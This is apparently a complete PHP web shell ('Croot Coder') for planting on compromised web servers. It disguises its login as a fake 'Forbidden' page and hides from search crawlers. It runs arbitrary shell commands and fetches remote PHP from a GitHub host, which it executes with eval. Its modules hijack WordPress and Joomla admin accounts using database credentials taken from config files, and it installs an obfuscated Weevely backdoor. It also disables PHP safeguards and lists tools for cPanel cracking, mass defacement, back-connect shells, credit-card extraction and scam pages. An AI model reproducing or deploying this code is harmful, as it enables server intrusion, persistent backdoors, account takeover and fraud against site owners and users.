<?php
/*Antonio*/
$auth_pass = "a685b2c638b812716eee71b0882bfb35";
$color = "#00FF66";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', '2.2');
if( get_magic_quotes_gpc() ) {
    function stripslashes_array($array) {
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
}
function printLogin() {
    ?>
<h1>Forbidden</h1>
<p>You don't have permission to acces on this server.</p>
<address>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</address>
    <style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }
    </style>
    <div style='position: fixed; bottom: 0px; left: 0px; width: 0px;'>  
    <form method=post>
    <input type=password name=pass>
    </form></div>
    
<?php
    exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
	if( empty( $auth_pass ) ||
		( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass) ) )
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		printLogin();
	echo'<head>
	<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
	<title>Croot Coder</title>
<body>
<style type="text/css">
	body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:11px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
body,table { font-family:verdana;font-size:11px;color:#CCCCCC;background-color:#333333; }
table { width:100%; border-color:#333333;border-width:0pt 1pt; border-style:solid; }
td {background-color: #000500; font-family: Courier New; font-size:11pt; color:#999999; border-color:#FFFFFF; border-width:1pt 0pt; border-style:solid; border-collapse:collapse;padding:0pt 3pt;vertical-align:middle;}
A:Link, A:Visited { color: #999999;	text-decoration: none; }
A.no:Link, A.no:Visited { text-decoration: none; }
A:Hover, A:Visited:Hover , A.no:Hover, A.no:Visited:Hover { color: # ; background-color:aqua; text-decoration: none; }
input,select,option { font:8pt tahoma;color:#666666;margin:2;border:1px solid #666666; }
textarea { color:#666666;font:verdana bold;border:1px solid ;margin:2; }
.fleft { float:left;text-align:left; }
.fright { float:right;text-align:right; }
#pagebar { font:8pt tahoma;padding:5px; border:3px solid #333333; border-collapse:collapse; }
#pagebar td { vertical-align:top; }
#pagebar p { font:8pt tahoma;}
#pagebar a { font-weight:bold;color:#666666; }
#pagebar a:visited { color:# ; }
#mainmenu { text-align:center; }
#mainmenu a { text-align: center;padding: 0px 5px 0px 5px; }
#maininfo,.barheader,.barheader2 { text-align:center; }
#maininfo td { padding:3px; }
.barheader { font-weight:bold;padding:5px; }
.barheader2 { padding:5px;border:2px solid #333333; }
.contents,.explorer { border-collapse:collapse;}
.contents td { vertical-align:top; }
.mainpanel { border-collapse:collapse;padding:5px; }
.barheader,.mainpanel table,td { border:1px solid #333333; }
.mainpanel input,select,option { border:1px solid #333333;margin:0; }
input[type="submit"] { border:1px solid #333333; }
input[type="text"] { padding:3px;}
.fxerrmsg { color:red; font-weight:bold; }
#pagebar,#pagebar p,h1,h2,h3,h4,form { margin:0; }
#pagebar,.mainpanel,input[type="submit"] { background-color:black; }
.barheader2,input,select,option,input[type="submit"]:hover { background-color:black; }
textarea,.mainpanel input,select,option { background-color:#000000; }
.blink {
    animation-duration: 1s;
    animation-iteration-count: infinite;
    animation-name: blink;
}
 
@keyframes blink {
    0% {
        opacity: 1;
    }
    75% {
        opacity: 1;
    }
    76% {
        opacity: 0;
    }
    100% {
        opacity: 0;
    }
}
// -->
</style>

<body bgcolor="black" >';
//Shell Lamaku //
set_time_limit(0);error_reporting(0);
function showstat($stat) {if ($stat=="on") {return "<b><font style='color:#00FF00'>ON</font></b>";}else {return "<b><font style='color:#ff0000'>OFF</font></b>";}}
function rapih($text){return trim(str_replace("<br>","",$text));} 
function magicboom($text){if (!get_magic_quotes_gpc()){return $text;} return stripslashes($text);} 
function showdir($pwd,$prompt){$fname = array();$dname = array();
 
if($tree > 2) 
for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
else $parent = $pwd;
foreach($dname as $folder){
if($folder == ".") {
if(!$win && $posix){$name=@posix_getpwuid(@fileowner($folder));$group=@posix_getgrgid(@filegroup($folder));$owner = $name['name']."<span class='gaya'> : </span>".$group['name'];} 
else {$owner = $user;}
$buff .= " 
  ";} 
else{if(!$win && $posix){ 
$name=@posix_getpwuid(@fileowner($folder)); 
$group=@posix_getgrgid(@filegroup($folder)); 
$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];} 
else { $owner = $user; }
$buff .= " ";}}
foreach($fname as $file){
$full = $pwd.$file;
if(!$win && $posix){$name=@posix_getpwuid(@fileowner($file)); $group=@posix_getgrgid(@filegroup($file)); $owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name'];} 
else { $owner = $user; }
$buff .= " ";} 
$buff .= "</table>"; return $buff;}
 ?>
 
<style>.title{font-weight:bold;letter-spacing:1px;font-family: "orbitron";color:  ;font-size:20px;text-shadow: 1px 1px 1px  ;}input[type=text]{-moz-box-shadow:0 0 1px black;-webkit-box-shadow:0 0 1px black;height:18px;margin-left: 5px;}input:focus, textarea:focus ,button:active{box-shadow: 0 0 1px aqua;-webkit-box-shadow: 0 0 1px rgba(0, 0, 255, 1);-moz-box-shadow: 0 0 1px rgba(9, 9, 255, 1);background: ;overflow: auto;}#menu{font-family:orbitron;background: ;margin:5px 2px 4px 2px;}div #menu li:hover {cursor:pointer;}div#menu li:hover>ul a:hover{width:118;background:rgba(0,155,150,0.2);}div#menu ul {margin:0;padding:0;float:left;-moz-border-radius: 6px; border-radius: 12px; border:1px solid aqua;}div#menu li {position:relative;display:block;float:left;}div#menu li:hover>ul {left:0px;border-left:1px solid #;}div#menu a{display:block;float:left;font-family:orbitron;padding:4px 6px;margin:0;text-decoration:none;letter-spacing:1px;color:#;}div#menu a:hover{background:rgba(0,155,150,0.2);font-family:orbitron;border-bottom:0px;}div#menu ul ul {position:absolute;top:18px;left:-990em;width:130px;padding:1px 0 5px 0;background: ;margin-top:2px;}div#menu ul ul a {padding:2px 2px 2px 10px;height:20px;float:none;display:block;color:#;}.HsH {text-align: center;letter-spacing:1px;font-family: "orbitron";color: # ;font-size:25px;text-shadow: 1px 1px 5px  ;} .mybox{-moz-border-radius: 10px; border-radius: 10px;border:1px solid aqua; padding:4px 2px;width:70%;line-height:24px;background:# ;box-shadow: 0px 1px 1px #;-webkit-box-shadow: 0px 4px 2px  aqua;-moz-box-shadow: 0px 1px 2px Darkviolet;}.myboxtbl{ width:50%; }body{background: ;} a {text-decoration:none;} hr, a:hover{border-bottom:1px solid aqua;} *{text-shadow: 0pt 0pt 0.3em rgb(153, 153, 153);font-size:11px;font-family:Tahoma,Verdana,Arial;color:aqua;} .tabnet{margin:15px auto 0 auto;border: 1px solid #333333;} .main {width:100%;} .gaya {color: aqua;} .top{border-left:1px solid aqua;border-RIGHT:1px solid aqua;font-family:verdana;} .inputz, option{outline:none;transition: all 0.20s ease-in-out;-webkit-transition: all 0.20s ease-in-out;-moz-transition: all 0.20s ease-in-out;border:1px solid aqua;background:#111111; border:0; padding:2px; border-bottom:1px solid #393939; font-size:11px; color:aqua; -moz-border-radius: 6px; border-radius: 12px; border:1px solid aqua;margin:4px 0 8px 0;} .inputzbut{background:#111111;color:#8f8f8f;margin:0 4px;border:1px solid aqua;}  .inputzbut:hover{background:#222222;border-left:1px solid aqua;border-right:1px solid aqua;border-bottom:1px solid aqua;border-top:1px solid aqua;}.inputz:hover{ -moz-border-radius: 6px; border-radius: 10px; border:1px solid aqua;margin:4px 0 8px 0;border-bottom:1px solid aqua;border-top:1px solid aqua;}.output2 {margin:auto;border:1px solid aqua;background: ;padding:0 2px;} textarea{margin:auto;border:2px solid aqua;background: ;padding:0 2px;} .output {margin:auto;border:1px solid #303030;width:100%;height:400px;background: ;padding:0 2px;} .cmdbox{width:100%;}.head_info{padding: 0 4px;} .b1{font-size:30px;padding:0;color:aqua;} .b2{font-size:30px;padding:0;color:aqua;} .b_tbl{text-align:center;margin:0 4px 0 0;padding:0 4px 0 0;border-right:1px solid #333333;} .phpinfo table{width:100%;padding:0 0 0 0;} .phpinfo td{background: ;color: ;padding:6px 8px;;} .phpinfo th, th{background:  ;border-bottom:1px solid   ;font-weight:normal;} .phpinfo h2, .phpinfo h2 a{text-align:center;font-size:16px;padding:0;margin:30px 0 0 0;background:  ;padding:4px 0;} .explore{width:100%;} .explore a {text-decoration:none;} .explore td{border-bottom:1px solid aqua ;padding:0 8px;line-height:24px;} .explore th{padding:3px 8px;font-weight:normal;color:#;} .explore th:hover , .phpinfo th:hover, th:hover{color: ;background:  ;} .explore tr:hover{background:rgba(35,96,156,0.2);} .viewfile{background: ;color: ;margin:4px 2px;padding:8px;} .sembunyi{display:none;padding:0;margin:0;} k, k a, k a:hover{text-shadow: 0pt 0pt 0.3em aqua;font-family:orbitron;font-size:25px;color: ;}</style> 
<?php if(isset($_GET['x']) && ($_GET['x'] == 'php')){?>
<form action="?y=
<?php echo $pwd;?>&amp;x=php" method="post"><table class="cmdbox"><tr><td>


</td></tr> 

<?php }

elseif(isset($_GET['x']) && ($_GET['x'] == 'js')) {
if ($_POST['symjo']) {$config = file_get_contents($_POST['url']);
$user = $_POST['user'];$pass = md5($_POST['pass']);
function ex($text,$a,$b){$explode = explode($a,$text);$explode = explode($b,$explode[1]);
return $explode[0];}


if($config && ereg('JConfig',$config)){$psswd =  ex($config,'$password = \'',"';");$username = ex($config,'$user = \'',"';");$dbname = ex($config,'$db = \'',"';");$prefix = ex($config,'$dbprefix = \'',"';");$host = ex($config,'$host = \'',"';");$email = ex($config,'$mailfrom = \'',"';");$formn = ex($config,'$fromname = \'',"';");$conn = mysql_connect($host,$username,$psswd) or die(mysql_error());
mysql_select_db($dbname,$conn) or die($username.' '.$psswd.' '.$host.' '.$dbname);$query = @mysql_query("UPDATE `".$prefix."users` SET `username` ='".$user."' , `password` = '".$pass."', `usertype` = 'Super Administrator', `block` = 0");if ($query) {
	
echo '<center><h2 class="HsH">Berhasil </h2></center>
<br><table width="100%"><tr><th width="30%">site name</th>
<th width="20%">user</th><th width="20%">password</th>
<th width="20%">email</th></tr><tr><td width="20%">
<font size="2" color="red">'.$formn.'</font></td>
<td width="20%">'.$user.'</td><td with="20%">'.$_POST["pass"].'</td>
<td width="20%">'.$email.'</td></tr></table>';}
else {echo '<h2 class="HsH"><font color="#ff0000">ERROR !</font></h2>';}}
else die('<h2 class="HsH"><font color="red">Jomla Config Salah Cok</font></h2>');
exit;
}
else { ?> 


<center><br><br><div class="mybox">
<form method="post"><table><h2 class="HsH">Joomla Config Brutefoce </h2>
<tr><td>config link : </td><td>
<input class="inputz" type="text" name="url" value=""></td></tr>
<tr><td>new user : </td><td><input class="inputz" type="text" name="user" value="admin"></td></tr>
<tr><td>new password : </td><td><input class="inputz" type="text" name="pass" value="HsH1337"></td></tr>
<tr><td><br></td></tr><tr><td><center><input type="submit" class="inputzbut" name="symjo" value="Ganti"></center></td><br></tr></table></form></div></center>


<?php exit;}}
elseif(isset($_GET['x']) && ($_GET['x'] == 'config'))
{ error_reporting(0);
if ($_POST['kill']) 
{$url = $_POST['url'];$user = $_POST['user'];$pass =$_POST['pass'];$pss = md5($pass);
function enter($text,$a,$b){$explode = explode($a,$text);$explode = explode($b,$explode[1]);
return $explode[0];}$config = file_get_contents($url);$password =  enter($config,"define('DB_PASSWORD', '","');");
$username =  enter($config,"define('DB_USER', '","');");$db =  enter($config,"define('DB_NAME', '","');");
$prefix =  enter($config,'$table_prefix  = \'',"';");$host =  enter($config,"define('DB_HOST', '","');");


if($config && preg_match('/DB_NAME/i',$config)){$conn= @mysql_connect($host,$username ,$password ) or die ("i can't connect to mysql, check your data");
@mysql_select_db($db,$conn) or die (mysql_error());
$grab = @mysql_query("SELECT * from  `wp_options` WHERE option_name='home'");
$data = @mysql_fetch_array($grab);$site_url = $data["option_value"];
$query = mysql_query("UPDATE `".$prefix."users` SET `user_login` = '".$user."',`user_pass` = '".$pss."' WHERE `ID` = 1");

if ($query) 
{echo '<center><h2 class="HsH">Berhasil</h2></center>
<br><table width="100%"><tr><th width="20%">site</th>
<th width="20%">user</th><th with="20%">password</th>
<th width="20%">link</th></tr><tr><td width="20%">
<font size="2" color="red">'.$site_url.'</font></td><td width="20%">'.$user.'</td>
<td with="20%">'.$pass.'</td><td width="20%">
<a href="'.$site_url.'/wp-login.php">
<font color="#00ff00">login</font></td></tr></table>';} 
else echo '<h2 class="HsH"><font color="#ff0000">ERROR !</font></h2>';} 
else die('<h2 class="HsH">Wordpress config Salah Cok</h2>');
exit;
} 
else { ?> 

<center><br><br><div class="mybox">
<form method="post">
<h2 style='font-size:26px;' class='HsH'>Wordpress Config Brutefoce</h2><br>
<table><tr><td>config link&nbsp;:&nbsp;</td>
<td><input size="26" class="inputz" type="text" name="url" value=""></td></tr>
<tr><td>new user&nbsp;:&nbsp;</td>
<td><input class="inputz" type="text" name="user" size="26" value="admin"></td></tr>
<tr><td>new password&nbsp;:&nbsp;</td>
<td><input class="inputz" type="text" size="26" name="pass" value="HsH1337"></td></tr><tr><td><br></td></tr>
<tr><td><center><input class="inputzbut" type="submit" name="kill" value=" Ganti "></center></td>
<br></tr></table></form></div></center>
<?php 
exit;}}
//Slorokan //
if($_GET['do'] == 'SloROkaN')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/34971q6eydrieuoisl0r0k4N.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}
//xdrupal //
if($_GET['do'] == 'XdRpLs')
{

$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/873r872yieuhw987ipl00cup.php";
$data = file_get_contents($url);
eval('?>'.$data);
exit;
}

function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
$perms = fileperms($file);
if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}
	// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));
// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));
// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));
return $info;
}
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
if(get_magic_quotes_gpc()) {
	function croot_ss($array) {
		return is_array($array) ? array_map('croot_ss', $array) : stripslashes($array);
	}
	$_POST = croot_ss($_POST);
}
error_reporting(0);
error_log(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";

//sabun//
if($_GET['do'] == 'SbN')
{
$url = "https://raw.githubusercontent.com/antoniola/rejeki/master/65243twazfsddd6ur.php";
$data = file_get_contents($url);
eval('?>'.$data);


exit;
}

if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "System: <font color=lime>".php_uname()."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=lime>".gethostbyname($_SERVER['HTTP_HOST'])."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=lime>".hdd(disk_free_space("/"))."</font> / <font color=lime>".hdd(disk_total_space("/"))."</font><br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}

echo "<table width='100%' class='table_home' border='0' cellpadding='3' cellspacing='1' align='center'>
		<tr>
		<th class='th_home'>";
echo "<ul>";
echo "
| <a href='?'><input class='button' type='button' value=Home></a>
| <a href='?dir=$dir&do=upload'><input class='button' type='button' value=Upload></a>
| <a href='?pentil'><input class='button' type='button' value=Subdomain&nbsp;Cheker></a> 
| <a href='?dir=$dir&do=MaG'><input class='button' type='button' value=Magento&nbsp;Grab&nbsp;DB></a> 
| <a href='?dir=$dir&do=config'><input class='button' type='button' value=Config></a> 
| <a href='?dir=$dir&do=nginceng'><input class='button' type='button' value=Nginceng></a> 
| <a href='?dir=$dir&do=cpanel'><input class='button' type='button' value=CPanel&nbsp;Crack></a> 
| <a href='?dir=$dir&do=smtp'><input class='button' type='button' value=SMTP&nbsp;Grab&nbsp;Config></a> 
| <a href='?dir=$dir&do=UaeZ'><input class='button' type='button' value=Upload&nbsp;Extract&nbsp;Zip></a> |

<br>

| <a href='?dir=$dir&do=CpC'><input class='button' type='button' value=CPanel&nbsp;Croot></a>
| <a href='?dir=$dir&do=UdMs'><input class='button' type='button' value=User&nbsp;Domain></a>
| <a href='?dir=$dir&do=SmpK'><input class='button' type='button' value=PHP&nbsp;Mailer&nbsp;2016></a>
| <a href='?dir=$dir&do=RmDs'><input class='button' type='button' value=Rooting&nbsp;Massdeface></a>
| <a href='?dir=$dir&do=SwPJmPL'><input class='button' type='button' value=Scaner&nbsp;Plugin&nbsp;WP&nbsp;JM></a>
| <a href='?dir=$dir&do=Whmcz211'><input class='button' type='button' value=Brute&nbsp;Whmcs></a>
| <a href='?dir=$dir&do=XdRpLs'><input class='button' type='button' value=Xmas&nbsp;Drupal></a>
| <a href='?dir=$dir&do=SloROkaN'><input class='button' type='button' value=Slorokan></a> |

<br>

| <a href='?dir=$dir&do=zoneh'><input class='button' type='button' value=Jones-H></a> 
| <a href='?dir=$dir&do=&x=js'><input class='button' type='button' value=Joomla&nbsp;Brutefoce&nbsp;Config></a>
| <a href='?dir=$dir&do=&x=config'><input class='button' type='button' value=Wodpres&nbsp;Brutefoce&nbsp;Config></a>
| <a href='?dir=$dir&do=SbN'><input class='button' type='button' value=Sabun></a> 
| <a href='?dir=$dir&do=WeVpeLy'><input class='button' type='button' value=Wevelly></a>
| <a href='?dir=$dir&do=network'><input class='button' type='button' value=Back&nbsp;Connect></a> 
| <a href='?dir=$dir&do=adminer'><input class='button' type='button' value=Adminer></a>
| <a href='?dir=$dir&do=fake_root'><input class='button' type='button' value=Fake&nbsp;Root></a> 
| <a href='?dir=$dir&do=installtmp'><input class='button' type='button' value=Install&nbsp;Api></a> |

<br>

| <a href='?dir=$dir&do=scmpg'><input class='button' type='button' value=Scampage&nbsp;Appel></a>
| <a href='?dir=$dir&do=ExAp'><input class='button' type='button' value=Extract&nbsp;Api></a>
| <a href='?dir=$dir&do=ExApL'><input class='button' type='button' value=Extract&nbsp;Appel></a>
| <a href='?dir=$dir&do=M'><input class='button' type='button' value=Sender></a>
| <a href='?dir=$dir&do=ExE'><input class='button' type='button' value=Email&nbsp;Extractor></a>
| <a href='?dir=$dir&do=PmE'><input class='button' type='button' value=Pemisah&nbsp;Email></a>
| <a href='?dir=$dir&do=ExTrPCc'><input class='button' type='button' value=Extrap&nbsp;CC></a>
| <a href='?dir=$dir&do=DdCc'><input class='button' type='button' value=Decode&nbsp;CC></a> 
| <a href='?dir=$dir&do=Files'><input class='button' type='button' value=Shell&nbsp;Mini></a> 
| <a href='?dir=$dir&do=SQL'><input class='button' type='button' value=SQL></a>
| <a href='?dir=$dir&do=Symlink2010'><input class='button' type='button' value=Symlink2010></a> 

| ";
echo "</ul>";
echo "</th></tr>";
//IPCKEREKU COK//
if(isset($_GET["pentil"]))
{
$site = $_GET["pentil"];
$nn = "http://domains.yougetsignal.com/domains.php";

//Curl Function
$ch = curl_init($nn);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
curl_setopt($ch, CURLOPT_POSTFIELDS, "remoteAddress=$site&ket=");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
$resp = curl_exec($ch);
$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",", str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
$array = explode(",,", $resp);
unset($array[0]);
echo "<table style='margin: 0 auto'>";
foreach($array as $lnk)
{
print "<tr><td><a style=\"color:#0076B1;\" href='$lnk' target=_blank>$lnk</a></td></tr>";
}
echo "</table>";
//Terusane Ip Chekere iki //
echo "<head>\n"; 
echo "<style>input[type=submit]{ padding: 3px; color: #;\n"; 
echo "text-align: center;\n"; 
echo "text-shadow: 0 1px rgba(255, 255, 255, 0.3);\n"; 
echo "background: #;\n"; 
echo "background-clip: padding-box;\n"; 
echo "border: 1px solid #;\n"; 
echo "border-bottom-color: #;\n"; 
echo "border-radius: 4px;\n"; 
echo "cursor: pointer;\n"; 
echo "background-image:-webkit-linear-gradient(top, #, #);\n"; 
echo "background-image: -moz-linear-gradient(top, #, #);\n"; 
echo "background-image: -o-linear-gradient(top, #, #);\n"; 
echo "background-image: linear-gradient(to bottom, #, #);\n"; 
echo "</style>\n"; 
echo "</head><br>\n";
echo "<center>--------------------------[ Subdomain IP Cheker ]-------------------------- </center>\n";
echo "<center></center><div id=result>";
echo "<center><br><form><input type='text' size='60' value='HsH.go.id' name='pentil' />&nbsp;<input type='submit' value='&nbsp;S&nbsp;c&nbsp;a&nbsp;n&nbsp;'></form></center>";
exit;
curl_close($ch);
}

//VEVELY KU //
error_reporting(0);
#chdir('');
//Some basic var's
if (!@$_GET['path']) {
    $dir = CleanDir(getcwd());
} else {
    $dir = CleanDir($_GET['path']);
}
$rootdir = CleanDir($_SERVER['DOCUMENT_ROOT']);
$domain = $_SERVER['HTTP_HOST'];
$script = $_SERVER['SCRIPT_NAME'];
$full_url = $_SERVER['REQUEST_URI'];
$script2 = basename($script);
$serverip = $_SERVER['SERVER_ADDR'];
$userip = $_SERVER['REMOTE_ADDR'];
$whoami = function_exists("posix_getpwuid") ? posix_getpwuid(posix_geteuid()) : exec("whoami");
$whoami = function_exists("posix_getpwuid") ? $whoami['name'] : exec("whoami");
$disabled = ini_get('disable_functions');
//Some functions
function CleanDir($directory) {
    $directory = str_replace("\\", "/", $directory);
    $directory = str_replace("//", "/", $directory);
    return $directory;
}
function success($for, $var1) {
    $domain = $_SERVER['HTTP_HOST'];
    $script = $_SERVER['SCRIPT_NAME'];
    $full_url = $_SERVER['REQUEST_URI'];
    if ($for == "filesave") {
        $message = "File Saved!";
        $redirect = "http://$domain$script?path=$var1";
    }
    if ($for == "weevely") {
        $message = "Weevely Conect Installed!";
        $redirect = "";
    }
    if (empty($redirect)) {
        echo "<script>
function remove (){
 document.getElementById('xbox').innerHTML='';
}
setInterval(function(){remove();}, 2700);
</script>";
    } else {
        echo "<script>
function remove (){
 window.location = '$redirect'
}
setInterval(function(){remove();}, 2500);
</script>";
    }
}
//Weevely Conect 
if($_GET['do'] == 'WeVpeLy') {
    echo "<center><font color='white' size='3'>
<form action='' method='post'>
Directory untuk menginstal Weevely Conect  :<br>
<input type='text' name='weev_dir' size='50' class='text' value='$dir'><br>
Nama file <br>
<input type='text' name='weev_name' class='text' value='weevely.php'><br>
Password minim 3 karakter <br>
<input type='text' name='weev_pass' class='text'><br>
<input type='submit' name='install_weev' value='Buat Sekarang'><br>
</font>
</center>";
}
if (isset($_POST['install_weev'])) {
    $weevdir = rtrim($_POST['weev_dir'], '/');;
    $weevname = $_POST['weev_name'];
    $weevpassword = $_POST['weev_pass'];
    if (strlen($weevpassword) < 3) {
        error("Password minim 3 characters!");
    } else {
        $first2 = $weevpassword[0] . $weevpassword[1];
        $rest = substr($weevpassword, 2);
        $money = "$";
        $weevelybd1 = base64_decode('ZnVuY3Rpb24gd2VldmVseSgpIHsNCiRjPSdjb3VudCc7DQokYT0kX0NPT0tJRTs=');
        $weevelybd2 = "if(reset($money" . "a)=='" . $first2 . "' && $money" . "c($money" . "a)>3) {";
        $weevelybd3 = "$money" . "k='$rest';";
        $weevelybd4 = base64_decode('ZWNobyAnPCcuJGsuJz4nOw0KZXZhbChiYXNlNjRfZGVjb2RlKHByZWdfcmVwbGFjZShhcnJheSgnL1teXHc9XHNdLycsJy9ccy8nKSwgYXJyYXkoJycsJysnKSwgam9pbihhcnJheV9zbGljZSgkYSwkYygkYSktMykpKSkpOw0KZWNobyAnPC8nLiRrLic+JzsNCn0NCn0NCndlZXZlbHkoKTs=');
        $all = "<?php\neval(base64_decode('" . base64_encode($weevelybd1 . $weevelybd2 . $weevelybd3 . $weevelybd4) . "'));\n?>";
        if (file_put_contents($weevdir . '/' . $weevname, $all)) {
            echo "<center><font color='white' size='3'>Weevely Conect Berhasil Dibuat </font></center><br>";
            success("weevely");
        } else {
            error("Failed to write Weevely Conect  to $weevdir");
        }
    }
}
echo "</form></div>";
closedir();
//Shell Gazaku iki //
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
error_reporting(0); 
$function_tkl = $_POST['function_tkl'];
$pwd = $_POST['pwd'];
$dir = $_POST['dir'];
if ($dir == ''){
$dir = getcwd();
}
if ($gaza == 'ini'){
$fp = fopen("php.ini","w+");
fwrite($fp,"safe_mode = Off
disable_functions  =    NONE
open_basedir = OFF ");
}


function hidTKL () {
echo "
<html>


<body>";
}
function fotTKL($gaza_text,$gaza_text1,$dir) {
echo " ";
}
function toolTKL () {
$tkl_tool = $_GET['do'];
switch($tkl_tool){

case "SQL":
